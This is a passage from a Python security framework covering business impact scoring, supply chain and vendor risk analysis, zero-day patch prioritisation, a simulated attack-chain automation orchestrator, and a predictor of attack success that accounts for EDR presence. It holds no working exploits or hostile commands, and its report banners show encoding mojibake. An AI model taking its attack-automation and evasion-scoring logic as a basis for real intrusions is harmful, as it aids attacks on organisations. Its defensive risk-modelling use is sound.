            'annual_revenue': profile.get('annual_revenue', 10000000),
            'employees': profile.get('employees', 100),
            'regulatory_requirements': profile.get('regulatory', ['gdpr']),
            'critical_systems': profile.get('critical_systems', []),
            'risk_tolerance': profile.get('risk_tolerance', 'medium')
        }
        
    def register_asset(self, asset_id: str, asset_info: Dict):
        """Register asset with value information."""
        self.asset_values[asset_id] = {
            'id': asset_id,
            'name': asset_info.get('name'),
            'type': asset_info.get('type', 'system'),
            'criticality': asset_info.get('criticality', 'medium'),
            'data_classification': asset_info.get('data_classification', 'internal'),
            'replacement_cost': asset_info.get('replacement_cost', 10000),
            'daily_revenue_impact': asset_info.get('daily_revenue_impact', 1000),
            'contains_pii': asset_info.get('contains_pii', False),
            'contains_phi': asset_info.get('contains_phi', False),
            'regulatory_scope': asset_info.get('regulatory_scope', [])
        }
        
    def calculate_chain_impact(self, chain: List[Dict]) -> Dict[str, Any]:
        """Calculate total impact of attack chain."""
        impact = {
            'financial_impact': {
                'direct': 0,
                'indirect': 0,
                'long_term': 0,
                'total': 0
            },
            'operational_impact': {
                'availability_score': 10,
                'integrity_score': 10,
                'confidentiality_score': 10,
                'overall': 10
            },
            'reputational_impact': {
                'customer_trust_impact': 0,
                'partner_trust_impact': 0,
                'regulatory_impact': 0,
                'overall': 0
            },
            'affected_assets': [],
            'regulatory_implications': [],
            'recovery_estimate': {}
        }
        
        for step in chain:
            target_assets = step.get('target_assets', [])
            technique = step.get('technique', '')
            
            for asset_id in target_assets:
                asset = self.asset_values.get(asset_id, {})
                if asset:
                    impact['affected_assets'].append(asset_id)
                    
                    # Calculate financial impact
                    step_financial = self._calculate_step_financial_impact(step, asset)
                    impact['financial_impact']['direct'] += step_financial.get('direct', 0)
                    impact['financial_impact']['indirect'] += step_financial.get('indirect', 0)
                    
                    # Calculate operational impact
                    step_operational = self._calculate_step_operational_impact(step, asset)
                    for key in ['availability_score', 'integrity_score', 'confidentiality_score']:
                        impact['operational_impact'][key] = min(
                            impact['operational_impact'][key],
                            step_operational.get(key, 10)
                        )
                        
                    # Check regulatory implications
                    if asset.get('contains_pii'):
                        impact['regulatory_implications'].append({
                            'asset': asset_id,
                            'regulation': 'GDPR/CCPA',
                            'potential_fine': self._estimate_regulatory_fine('gdpr')
                        })
                    if asset.get('contains_phi'):
                        impact['regulatory_implications'].append({
                            'asset': asset_id,
                            'regulation': 'HIPAA',
                            'potential_fine': self._estimate_regulatory_fine('hipaa')
                        })
                        
        # Calculate totals
        impact['financial_impact']['total'] = (
            impact['financial_impact']['direct'] +
            impact['financial_impact']['indirect'] +
            sum(r.get('potential_fine', 0) for r in impact['regulatory_implications'])
        )
        
        impact['operational_impact']['overall'] = (
            impact['operational_impact']['availability_score'] +
            impact['operational_impact']['integrity_score'] +
            impact['operational_impact']['confidentiality_score']
        ) / 3
        
        impact['reputational_impact']['overall'] = self._calculate_reputational_impact(impact)
        
        impact['recovery_estimate'] = self._estimate_recovery(impact)
        
        return impact
        
    def _calculate_step_financial_impact(self, step: Dict, asset: Dict) -> Dict[str, float]:
        """Calculate financial impact of single step."""
        impact_type = step.get('impact_type', 'compromise')
        
        base_costs = {
            'compromise': asset.get('replacement_cost', 10000) * 0.1,
            'data_breach': asset.get('replacement_cost', 10000) * 0.5,
            'ransomware': asset.get('replacement_cost', 10000) * 2,
            'destruction': asset.get('replacement_cost', 10000)
        }
        
        direct = base_costs.get(impact_type, 10000)
        
        # Indirect costs based on downtime
        downtime_days = step.get('estimated_downtime_days', 1)
        indirect = asset.get('daily_revenue_impact', 1000) * downtime_days
        
        return {
            'direct': direct,
            'indirect': indirect
        }
        
    def _calculate_step_operational_impact(self, step: Dict, asset: Dict) -> Dict[str, int]:
        """Calculate operational impact of single step."""
        technique = step.get('technique', '')
        criticality = asset.get('criticality', 'medium')
        
        # Base scores
        availability = 10
        integrity = 10
        confidentiality = 10
        
        # Reduce based on technique type
        if 'denial' in technique.lower() or 'destruction' in technique.lower():
            availability -= 5 if criticality == 'high' else 3
            
        if 'modify' in technique.lower() or 'tamper' in technique.lower():
            integrity -= 5 if criticality == 'high' else 3
            
        if 'exfil' in technique.lower() or 'theft' in technique.lower():
            confidentiality -= 5 if criticality == 'high' else 3
            
        return {
            'availability_score': max(0, availability),
            'integrity_score': max(0, integrity),
            'confidentiality_score': max(0, confidentiality)
        }
        
    def _estimate_regulatory_fine(self, regulation: str) -> float:
        """Estimate potential regulatory fine."""
        annual_revenue = self.organization_profile.get('annual_revenue', 10000000)
        
        fine_rates = {
            'gdpr': 0.04,  # Up to 4% of annual revenue
            'hipaa': 0.01,
            'pci': 0.005,
            'sox': 0.02
        }
        
        rate = fine_rates.get(regulation.lower(), 0.01)
        return annual_revenue * rate
        
    def _calculate_reputational_impact(self, impact: Dict) -> float:
        """Calculate overall reputational impact score."""
        score = 0
        
        # Data breach increases reputational damage
        affected_assets = len(impact.get('affected_assets', []))
        score += min(30, affected_assets * 5)
        
        # Regulatory violations increase damage
        regulatory_issues = len(impact.get('regulatory_implications', []))
        score += min(40, regulatory_issues * 20)
        
        # Financial impact affects reputation
        total_financial = impact['financial_impact'].get('total', 0)
        if total_financial > 1000000:
            score += 20
        elif total_financial > 100000:
            score += 10
            
        return min(100, score)
        
    def _estimate_recovery(self, impact: Dict) -> Dict[str, Any]:
        """Estimate recovery time and cost."""
        affected_count = len(impact.get('affected_assets', []))
        operational_score = impact['operational_impact'].get('overall', 10)
        
        # Recovery time in days
        base_time = 1
        time_multiplier = (10 - operational_score) / 2
        recovery_days = base_time + (affected_count * time_multiplier)
        
        # Recovery cost
        daily_cost = self.organization_profile.get('employees', 100) * 500
        recovery_cost = recovery_days * daily_cost
        
        return {
            'estimated_days': round(recovery_days, 1),
            'estimated_cost': round(recovery_cost, 2),
            'full_operational': f"{round(recovery_days * 1.5, 1)} days",
            'confidence': 'medium'
        }
        
    def generate_impact_report(self, chain: List[Dict]) -> str:
        """Generate human-readable impact report."""
        impact = self.calculate_chain_impact(chain)
        
        report = f"""
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                    BUSINESS IMPACT ASSESSMENT                     ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù

üìä FINANCIAL IMPACT
   Direct Costs: ${impact['financial_impact']['direct']:,.2f}
   Indirect Costs: ${impact['financial_impact']['indirect']:,.2f}
   Regulatory Fines: ${sum(r.get('potential_fine', 0) for r in impact['regulatory_implications']):,.2f}
   TOTAL: ${impact['financial_impact']['total']:,.2f}

üîß OPERATIONAL IMPACT
   Availability: {impact['operational_impact']['availability_score']}/10
   Integrity: {impact['operational_impact']['integrity_score']}/10
   Confidentiality: {impact['operational_impact']['confidentiality_score']}/10
   Overall CIA Score: {impact['operational_impact']['overall']:.1f}/10

üì∞ REPUTATIONAL IMPACT
   Overall Score: {impact['reputational_impact']['overall']}/100
   Risk Level: {'HIGH' if impact['reputational_impact']['overall'] > 60 else 'MEDIUM' if impact['reputational_impact']['overall'] > 30 else 'LOW'}

‚ö†Ô∏è REGULATORY IMPLICATIONS
   Affected Regulations: {len(impact['regulatory_implications'])}

üîÑ RECOVERY ESTIMATE
   Time to Recovery: {impact['recovery_estimate']['estimated_days']} days
   Recovery Cost: ${impact['recovery_estimate']['estimated_cost']:,.2f}
   Full Operational: {impact['recovery_estimate']['full_operational']}
"""
        
        return report


# =============================================================================
# SUPPLY CHAIN ATTACK ANALYZER - Third-Party Risk Assessment
# =============================================================================

class SupplyChainAttackAnalyzer:
    """
    Advanced supply chain attack analysis and third-party risk assessment.
    Maps dependencies and identifies supply chain attack vectors.
    """
    
    ATTACK_VECTORS = {
        'software_supply_chain': {
            'T1195.001': 'Compromise Software Dependencies',
            'T1195.002': 'Compromise Software Supply Chain',
            'T1195.003': 'Compromise Hardware Supply Chain',
            'dependency_confusion': 'Dependency Confusion Attack',
            'typosquatting': 'Package Typosquatting'
        },
        'third_party_access': {
            'T1199': 'Trusted Relationship',
            'vendor_compromise': 'Vendor Account Compromise',
            'msp_abuse': 'MSP/MSSP Abuse'
        },
        'update_mechanism': {
            'update_hijacking': 'Update Mechanism Hijacking',
            'signing_key_theft': 'Code Signing Key Theft',
            'build_injection': 'Build Pipeline Injection'
        }
    }
    
    def __init__(self):
        self.dependencies: Dict[str, Dict] = {}
        self.vendors: Dict[str, Dict] = {}
        self.risk_assessments: List[Dict] = []
        self.supply_chain_graph: Dict[str, List[str]] = {}
        
    def map_dependencies(self, software_inventory: List[Dict]) -> Dict[str, Any]:
        """Map software dependencies and identify risks."""
        dependency_map = {
            'direct_dependencies': [],
            'transitive_dependencies': [],
            'high_risk_packages': [],
            'outdated_packages': [],
            'vulnerability_counts': {}
        }
        
        for software in software_inventory:
            pkg = {
                'name': software.get('name'),
                'version': software.get('version'),
                'type': software.get('type', 'library'),
                'source': software.get('source', 'unknown'),
                'last_updated': software.get('last_updated'),
                'maintainers': software.get('maintainers', 0),
                'known_vulnerabilities': software.get('vulnerabilities', [])
            }
            
            # Assess package risk
            risk = self._assess_package_risk(pkg)
            pkg['risk_score'] = risk
            
            if software.get('direct', True):
                dependency_map['direct_dependencies'].append(pkg)
            else:
                dependency_map['transitive_dependencies'].append(pkg)
                
            if risk > 7:
                dependency_map['high_risk_packages'].append(pkg)
                
            self.dependencies[pkg['name']] = pkg
            
        return dependency_map
        
    def _assess_package_risk(self, package: Dict) -> int:
        """Assess risk score for a package (1-10)."""
        risk = 3  # Base risk
        
        # Few maintainers increases risk
        maintainers = package.get('maintainers', 1)
        if maintainers <= 1:
            risk += 2
        elif maintainers <= 3:
            risk += 1
            
        # Known vulnerabilities
        vuln_count = len(package.get('known_vulnerabilities', []))
        risk += min(3, vuln_count)
        
        # Unknown source
        if package.get('source') == 'unknown':
            risk += 2
            
        # Age of last update
        last_updated = package.get('last_updated')
        if last_updated:
            # Simplified - check if "old"
            if '2022' in str(last_updated) or '2021' in str(last_updated):
                risk += 1
                
        return min(10, risk)
        
    def register_vendor(self, vendor_id: str, vendor_info: Dict):
        """Register a third-party vendor."""
        self.vendors[vendor_id] = {
            'id': vendor_id,
            'name': vendor_info.get('name'),
            'type': vendor_info.get('type', 'software'),
            'access_level': vendor_info.get('access_level', 'limited'),
            'data_access': vendor_info.get('data_access', []),
            'network_access': vendor_info.get('network_access', False),
            'security_certifications': vendor_info.get('certifications', []),
            'last_assessment': vendor_info.get('last_assessment'),
            'incident_history': vendor_info.get('incidents', 0)
        }
        
        # Build supply chain graph
        for connection in vendor_info.get('connections', []):
            if vendor_id not in self.supply_chain_graph:
                self.supply_chain_graph[vendor_id] = []
            self.supply_chain_graph[vendor_id].append(connection)
            
    def assess_vendor_risk(self, vendor_id: str) -> Dict[str, Any]:
        """Assess risk of a specific vendor."""
        vendor = self.vendors.get(vendor_id, {})
        if not vendor:
            return {'error': 'Vendor not found'}
            
        risk_factors = []
        risk_score = 3  # Base
        
        # Access level risk
        access_level = vendor.get('access_level', 'limited')
        if access_level == 'full':
            risk_score += 3
            risk_factors.append('Full system access')
        elif access_level == 'elevated':
            risk_score += 2
            risk_factors.append('Elevated access')
            
        # Data access risk
        data_access = vendor.get('data_access', [])
        if 'pii' in data_access or 'phi' in data_access:
            risk_score += 2
            risk_factors.append('Access to sensitive data')
            
        # Network access
        if vendor.get('network_access'):
            risk_score += 1
            risk_factors.append('Network access granted')
            
        # Security certifications reduce risk
        certs = vendor.get('security_certifications', [])
        if 'soc2' in certs:
            risk_score -= 1
        if 'iso27001' in certs:
            risk_score -= 1
            
        # Incident history
        incidents = vendor.get('incident_history', 0)
        risk_score += min(2, incidents)
        if incidents > 0:
            risk_factors.append(f'{incidents} past incidents')
            
        assessment = {
            'vendor_id': vendor_id,
            'vendor_name': vendor.get('name'),
            'risk_score': min(10, max(1, risk_score)),
            'risk_factors': risk_factors,
            'mitigations': self._suggest_vendor_mitigations(risk_factors),
            'assessment_date': datetime.now().isoformat()
        }
        
        self.risk_assessments.append(assessment)
        return assessment
        
    def _suggest_vendor_mitigations(self, risk_factors: List[str]) -> List[str]:
        """Suggest mitigations for vendor risks."""
        mitigations = []
        
        if 'Full system access' in risk_factors:
            mitigations.append('Implement privileged access management (PAM)')
            mitigations.append('Enable detailed audit logging')
            
        if 'Access to sensitive data' in risk_factors:
            mitigations.append('Implement data loss prevention (DLP)')
            mitigations.append('Require encryption in transit and at rest')
            
        if 'Network access granted' in risk_factors:
            mitigations.append('Segment vendor network access')
            mitigations.append('Implement network monitoring')
            
        if any('incident' in f.lower() for f in risk_factors):
            mitigations.append('Increase monitoring frequency')
            mitigations.append('Request incident response plan')
            
        return mitigations
        
    def identify_attack_paths(self) -> List[Dict]:
        """Identify potential supply chain attack paths."""
        attack_paths = []
        
        # Check for high-risk packages
        for pkg_name, pkg in self.dependencies.items():
            if pkg.get('risk_score', 0) >= 7:
                attack_paths.append({
                    'type': 'dependency',
                    'target': pkg_name,
                    'risk_score': pkg['risk_score'],
                    'attack_vector': 'T1195.001',
                    'description': f"High-risk dependency: {pkg_name}",
                    'potential_impact': 'Code execution in build/runtime'
                })
                
        # Check for risky vendors
        for vendor_id, vendor in self.vendors.items():
            if vendor.get('access_level') in ['full', 'elevated']:
                attack_paths.append({
                    'type': 'vendor',
                    'target': vendor_id,
                    'risk_score': self.assess_vendor_risk(vendor_id).get('risk_score', 5),
                    'attack_vector': 'T1199',
                    'description': f"Vendor with elevated access: {vendor.get('name')}",
                    'potential_impact': 'Lateral movement via trusted relationship'
                })
                
        # Sort by risk
        attack_paths.sort(key=lambda x: x['risk_score'], reverse=True)
        
        return attack_paths
        
    def generate_supply_chain_report(self) -> Dict[str, Any]:
        """Generate comprehensive supply chain risk report."""
        return {
            'summary': {
                'total_dependencies': len(self.dependencies),
                'high_risk_dependencies': sum(1 for d in self.dependencies.values() if d.get('risk_score', 0) >= 7),
                'total_vendors': len(self.vendors),
                'high_risk_vendors': sum(1 for v in self.vendors.values() if v.get('access_level') == 'full')
            },
            'attack_paths': self.identify_attack_paths()[:10],
            'risk_assessments': self.risk_assessments,
            'recommendations': self._generate_supply_chain_recommendations()
        }
        
    def _generate_supply_chain_recommendations(self) -> List[str]:
        """Generate supply chain security recommendations."""
        recs = []
        
        high_risk_deps = sum(1 for d in self.dependencies.values() if d.get('risk_score', 0) >= 7)
        if high_risk_deps > 0:
            recs.append(f"üî¥ {high_risk_deps} high-risk dependencies require immediate review")
            
        low_maintainer = sum(1 for d in self.dependencies.values() if d.get('maintainers', 1) <= 1)
        if low_maintainer > 5:
            recs.append(f"‚ö†Ô∏è {low_maintainer} packages have single maintainer - consider alternatives")
            
        full_access_vendors = sum(1 for v in self.vendors.values() if v.get('access_level') == 'full')
        if full_access_vendors > 0:
            recs.append(f"üîê {full_access_vendors} vendor(s) have full access - implement PAM")
            
        return recs


# =============================================================================
# ZERO DAY TRACKING ENGINE - Vulnerability Intelligence
# =============================================================================

class ZeroDayTrackingEngine:
    """
    Track and analyze zero-day vulnerabilities and emerging threats.
    Integrates with threat intelligence feeds for real-time updates.
    """
    
    def __init__(self):
        self.tracked_zerodays: Dict[str, Dict] = {}
        self.vulnerability_feed: List[Dict] = []
        self.exploit_availability: Dict[str, str] = {}
        self.affected_assets: Dict[str, List[str]] = {}
        
    def track_vulnerability(self, vuln_id: str, vuln_info: Dict):
        """Track a new vulnerability."""
        self.tracked_zerodays[vuln_id] = {
            'id': vuln_id,
            'name': vuln_info.get('name'),
            'cve': vuln_info.get('cve'),
            'cvss': vuln_info.get('cvss', 0),
            'cvss_vector': vuln_info.get('cvss_vector'),
            'affected_products': vuln_info.get('affected_products', []),
            'exploit_available': vuln_info.get('exploit_available', False),
            'exploit_maturity': vuln_info.get('exploit_maturity', 'unproven'),
            'in_the_wild': vuln_info.get('in_the_wild', False),
            'ransomware_associated': vuln_info.get('ransomware', False),
            'discovered_date': vuln_info.get('discovered'),
            'patch_available': vuln_info.get('patch_available', False),
            'patch_date': vuln_info.get('patch_date'),
            'workaround_available': vuln_info.get('workaround', False),
            'threat_actors': vuln_info.get('threat_actors', [])
        }
        
        self.exploit_availability[vuln_id] = vuln_info.get('exploit_maturity', 'unproven')
        
    def correlate_with_assets(self, asset_inventory: List[Dict]) -> Dict[str, Any]:
        """Correlate vulnerabilities with asset inventory."""
        correlations = {
            'affected_assets': [],
            'critical_exposures': [],
            'patch_priorities': []
        }
        
        for vuln_id, vuln in self.tracked_zerodays.items():
            affected_products = vuln.get('affected_products', [])
            
            for asset in asset_inventory:
                asset_products = asset.get('software', [])
                
                # Check for matches
                for product in affected_products:
                    if any(product.lower() in ap.lower() for ap in asset_products):
                        exposure = {
                            'asset_id': asset.get('id'),
                            'asset_name': asset.get('name'),
                            'vulnerability': vuln_id,
                            'cvss': vuln.get('cvss', 0),
                            'exploit_available': vuln.get('exploit_available'),
                            'in_the_wild': vuln.get('in_the_wild'),
                            'patch_available': vuln.get('patch_available')
                        }
                        
                        correlations['affected_assets'].append(exposure)
                        
                        # Critical if CVSS >= 9 and exploit available
                        if vuln.get('cvss', 0) >= 9 and vuln.get('exploit_available'):
                            correlations['critical_exposures'].append(exposure)
                            
                        # Patch priority
                        priority = self._calculate_patch_priority(vuln, asset)
                        correlations['patch_priorities'].append({
                            **exposure,
                            'priority_score': priority
                        })
                        
        # Sort patch priorities
        correlations['patch_priorities'].sort(key=lambda x: x['priority_score'], reverse=True)
        
        return correlations
        
    def _calculate_patch_priority(self, vuln: Dict, asset: Dict) -> int:
        """Calculate patch priority score."""
        score = 0
        
        # CVSS score
        cvss = vuln.get('cvss', 0)
        score += int(cvss * 2)
        
        # Exploit availability
        if vuln.get('exploit_available'):
            score += 20
        if vuln.get('in_the_wild'):
            score += 30
        if vuln.get('ransomware_associated'):
            score += 25
            
        # Asset criticality
        criticality = asset.get('criticality', 'medium')
        if criticality == 'critical':
            score += 30
        elif criticality == 'high':
            score += 20
        elif criticality == 'medium':
            score += 10
            
        # External exposure
        if asset.get('internet_facing'):
            score += 15
            
        return min(100, score)
        
    def get_exploit_landscape(self) -> Dict[str, Any]:
        """Get current exploit landscape summary."""
        landscape = {
            'total_tracked': len(self.tracked_zerodays),
            'with_exploits': sum(1 for v in self.tracked_zerodays.values() if v.get('exploit_available')),
            'in_the_wild': sum(1 for v in self.tracked_zerodays.values() if v.get('in_the_wild')),
            'ransomware_related': sum(1 for v in self.tracked_zerodays.values() if v.get('ransomware_associated')),
            'no_patch': sum(1 for v in self.tracked_zerodays.values() if not v.get('patch_available')),
            'by_severity': {
                'critical': sum(1 for v in self.tracked_zerodays.values() if v.get('cvss', 0) >= 9),
                'high': sum(1 for v in self.tracked_zerodays.values() if 7 <= v.get('cvss', 0) < 9),
                'medium': sum(1 for v in self.tracked_zerodays.values() if 4 <= v.get('cvss', 0) < 7),
                'low': sum(1 for v in self.tracked_zerodays.values() if v.get('cvss', 0) < 4)
            },
            'exploit_maturity': self._count_by_maturity()
        }
        
        return landscape
        
    def _count_by_maturity(self) -> Dict[str, int]:
        """Count vulnerabilities by exploit maturity."""
        counts = {
            'weaponized': 0,
            'poc': 0,
            'functional': 0,
            'unproven': 0
        }
        
        for vuln in self.tracked_zerodays.values():
            maturity = vuln.get('exploit_maturity', 'unproven')
            counts[maturity] = counts.get(maturity, 0) + 1
            
        return counts
        
    def generate_threat_brief(self) -> str:
        """Generate threat intelligence brief."""
        landscape = self.get_exploit_landscape()
        
        critical_vulns = [v for v in self.tracked_zerodays.values() 
                        if v.get('cvss', 0) >= 9 and v.get('exploit_available')]
        
        brief = f"""
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                    ZERO-DAY THREAT BRIEF                          ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù

üìä VULNERABILITY LANDSCAPE
   Total Tracked: {landscape['total_tracked']}
   With Public Exploits: {landscape['with_exploits']}
   Actively Exploited: {landscape['in_the_wild']}
   No Patch Available: {landscape['no_patch']}

üî¥ SEVERITY DISTRIBUTION
   Critical (CVSS 9+): {landscape['by_severity']['critical']}
   High (CVSS 7-8.9): {landscape['by_severity']['high']}
   Medium (CVSS 4-6.9): {landscape['by_severity']['medium']}
   Low (CVSS <4): {landscape['by_severity']['low']}

üíÄ EXPLOIT MATURITY
   Weaponized: {landscape['exploit_maturity']['weaponized']}
   Functional: {landscape['exploit_maturity']['functional']}
   PoC Available: {landscape['exploit_maturity']['poc']}
   Unproven: {landscape['exploit_maturity']['unproven']}

‚ö†Ô∏è CRITICAL ALERTS
"""
        
        for vuln in critical_vulns[:5]:
            brief += f"   ‚Ä¢ {vuln.get('id')}: {vuln.get('name', 'Unknown')[:40]}\n"
            brief += f"     CVSS: {vuln.get('cvss')} | ITW: {'Yes' if vuln.get('in_the_wild') else 'No'}\n"
            
        return brief


# =============================================================================
# ATTACK AUTOMATION ORCHESTRATOR - Full Attack Automation
# =============================================================================

class AttackAutomationOrchestrator:
    """
    Full attack chain automation and orchestration engine.
    Executes attack chains with decision logic and error handling.
    """
    
    def __init__(self):
        self.automation_jobs: Dict[str, Dict] = {}
        self.execution_logs: List[Dict] = []
        self.decision_tree: Dict[str, Dict] = {}
        self.rollback_points: List[Dict] = []
        self.pause_conditions: List[Callable] = []
        
    def create_automation_job(self, job_id: str, config: Dict) -> Dict:
        """Create an automation job."""
        job = {
            'id': job_id,
            'name': config.get('name', 'Unnamed Job'),
            'chain': config.get('chain', []),
            'schedule': config.get('schedule'),
            'execution_mode': config.get('mode', 'sequential'),
            'error_handling': config.get('error_handling', 'pause'),
            'notification_config': config.get('notifications', {}),
            'status': 'created',
            'created_at': datetime.now().isoformat(),
            'started_at': None,
            'completed_at': None,
            'current_step': 0,
            'results': []
        }
        
        self.automation_jobs[job_id] = job
        return job
        
    def configure_decision_tree(self, decisions: Dict):
        """Configure decision tree for conditional execution."""
        self.decision_tree = decisions
        
    def add_rollback_point(self, point: Dict):
        """Add a rollback point."""
        self.rollback_points.append({
            'id': f"rb_{len(self.rollback_points) + 1}",
            'step': point.get('step'),
            'state': point.get('state', {}),
            'created_at': datetime.now().isoformat()
        })
        
    def execute_job(self, job_id: str) -> Dict[str, Any]:
        """Execute an automation job (simulated)."""
        if job_id not in self.automation_jobs:
            return {'success': False, 'error': 'Job not found'}
            
        job = self.automation_jobs[job_id]
        job['status'] = 'running'
        job['started_at'] = datetime.now().isoformat()
        
        results = {
            'job_id': job_id,
            'steps_executed': 0,
            'steps_succeeded': 0,
            'steps_failed': 0,
            'step_results': []
        }
        
        for i, step in enumerate(job.get('chain', [])):
            # Check pause conditions
            if self._check_pause_conditions():
                job['status'] = 'paused'
                results['paused_at_step'] = i
                break
                
            # Execute step
            step_result = self._execute_step(step)
            results['steps_executed'] += 1
            results['step_results'].append(step_result)
            
            if step_result.get('success'):
                results['steps_succeeded'] += 1
                job['current_step'] = i + 1
            else:
                results['steps_failed'] += 1
                
                # Handle error based on config
                error_handling = job.get('error_handling', 'pause')
                if error_handling == 'stop':
                    job['status'] = 'failed'
                    break
                elif error_handling == 'pause':
                    job['status'] = 'paused'
                    break
                elif error_handling == 'skip':
                    continue
                elif error_handling == 'rollback':
                    self._perform_rollback()
                    job['status'] = 'rolled_back'
                    break
                    
            # Log execution
            self._log_execution(step, step_result)
            
            # Add rollback point after successful step
            if step_result.get('success'):
                self.add_rollback_point({
                    'step': i,
                    'state': step_result.get('state', {})
                })
                
        # Complete job
        if job['status'] == 'running':
            job['status'] = 'completed'
            
        job['completed_at'] = datetime.now().isoformat()
        job['results'] = results
        
        return results
        
    def _execute_step(self, step: Dict) -> Dict:
        """Execute a single step (simulated)."""
        # Simulate execution
        success_prob = step.get('success_probability', 0.85)
        success = random.random() < success_prob
        
        result = {
            'step_id': step.get('id'),
            'step_name': step.get('name'),
            'success': success,
            'start_time': datetime.now().isoformat(),
            'duration_seconds': random.randint(1, 30),
            'output': 'Simulated output' if success else 'Simulated error',
            'state': {'compromised': True} if success else {}
        }
        
        return result
        
    def _check_pause_conditions(self) -> bool:
        """Check if any pause conditions are met."""
        for condition in self.pause_conditions:
            try:
                if condition():
                    return True
            except Exception:
                pass
        return False
        
    def _perform_rollback(self):
        """Perform rollback to last known good state."""
        if self.rollback_points:
            last_point = self.rollback_points[-1]
            # In real implementation, would restore state
            return last_point
        return None
        
    def _log_execution(self, step: Dict, result: Dict):
        """Log step execution."""
        self.execution_logs.append({
            'timestamp': datetime.now().isoformat(),
            'step': step.get('name'),
            'success': result.get('success'),
            'duration': result.get('duration_seconds')
        })
        
    def get_job_status(self, job_id: str) -> Dict[str, Any]:
        """Get status of automation job."""
        job = self.automation_jobs.get(job_id)
        if not job:
            return {'error': 'Job not found'}
            
        return {
            'job_id': job_id,
            'name': job.get('name'),
            'status': job.get('status'),
            'progress': {
                'current_step': job.get('current_step', 0),
                'total_steps': len(job.get('chain', [])),
                'percent': (job.get('current_step', 0) / max(1, len(job.get('chain', [])))) * 100
            },
            'timing': {
                'created': job.get('created_at'),
                'started': job.get('started_at'),
                'completed': job.get('completed_at')
            },
            'results': job.get('results', {})
        }
        
    def list_jobs(self) -> List[Dict]:
        """List all automation jobs."""
        return [
            {
                'id': job_id,
                'name': job.get('name'),
                'status': job.get('status'),
                'steps': len(job.get('chain', []))
            }
            for job_id, job in self.automation_jobs.items()
        ]


# =============================================================================
# MACHINE LEARNING THREAT PREDICTOR - AI-Powered Threat Prediction
# =============================================================================

class MLThreatPredictor:
    """
    Machine learning-based threat prediction and chain optimization.
    Uses historical data to predict attack success and detection.
    """
    
    def __init__(self):
        self.training_data: List[Dict] = []
        self.model_weights: Dict[str, float] = {}
        self.feature_importance: Dict[str, float] = {}
        self.prediction_history: List[Dict] = []
        
    def train_from_history(self, attack_history: List[Dict]):
        """Train predictor from historical attack data."""
        self.training_data = attack_history
        
        # Simple feature extraction and weight calculation
        feature_counts = {
            'technique_success': {},
            'target_os_success': {},
            'time_of_day_success': {},
            'chain_length_success': {}
        }
        
        for attack in attack_history:
            technique = attack.get('technique', 'unknown')
            success = attack.get('success', False)
            target_os = attack.get('target_os', 'unknown')
            
            # Track success rates
            if technique not in feature_counts['technique_success']:
                feature_counts['technique_success'][technique] = {'success': 0, 'total': 0}
            feature_counts['technique_success'][technique]['total'] += 1
            if success:
                feature_counts['technique_success'][technique]['success'] += 1
                
        # Calculate weights
        for technique, counts in feature_counts['technique_success'].items():
            if counts['total'] > 0:
                self.model_weights[technique] = counts['success'] / counts['total']
                
        # Set feature importance
        self.feature_importance = {
            'technique': 0.35,
            'target_os': 0.20,
            'chain_position': 0.15,
            'stealth_level': 0.15,
            'time_of_day': 0.10,
            'defender_present': 0.05
        }
        
    def predict_success(self, attack_step: Dict) -> Dict[str, float]:
        """Predict success probability for attack step."""
        technique = attack_step.get('technique', 'unknown')
        
        # Base prediction from historical data
        base_prob = self.model_weights.get(technique, 0.5)
        
        # Adjust based on features
        adjustments = 0
        
        # Stealth adjustment
        stealth = attack_step.get('stealth', 5)
        adjustments += (stealth - 5) * 0.02
        
        # Target OS familiarity
        target_os = attack_step.get('target_os', 'unknown')
        if target_os == 'windows':
            adjustments += 0.05  # More familiar
        elif target_os == 'linux':
            adjustments += 0.03
            
        # Defender presence
        if attack_step.get('edr_present'):
            adjustments -= 0.15
            
        final_prob = min(0.95, max(0.05, base_prob + adjustments))
        
